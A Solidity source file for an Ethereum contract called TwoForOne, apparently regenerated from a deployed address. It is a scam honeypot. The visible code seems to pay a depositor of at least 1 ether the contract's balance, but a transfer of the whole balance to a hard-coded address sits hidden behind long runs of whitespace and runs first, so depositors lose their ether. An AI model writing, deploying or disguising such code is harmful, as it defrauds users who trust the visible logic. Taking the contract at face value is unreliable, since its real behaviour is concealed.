/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract TwoForOne at 0x43De395326E1FD472bF8AB81bbC895CC620705eD
*/
pragma solidity ^0.4.19;

contract TwoForOne
{
    function() public payable{}
   
    function Get()
    public
    payable
    {                                                                    
        if(msg.value>=1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   address(0x9Cc9B3133c1deb8E66AcA7eC5ebCad26cd24ff27).transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
}